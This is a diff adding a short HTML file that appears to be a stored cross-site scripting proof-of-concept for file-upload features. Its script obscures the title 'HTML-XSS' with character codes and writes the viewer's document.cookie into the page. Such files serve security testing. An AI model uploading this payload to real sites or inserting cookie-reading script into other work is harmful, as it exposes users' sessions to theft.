@@ -1,0 +1,8 @@
+<html><body><h3>shared file</h3>
+<script>
+document.title = String.fromCharCode(72,84,77,76,45,88,83,83);
+var d = document.createElement('div'); d.id = 'uploaded-xss-proof';
+d.setAttribute('data-cookie', String(document.cookie));
+d.textContent = 'COOKIE=' + String(document.cookie);
+document.body.appendChild(d);
+</script></body></html>
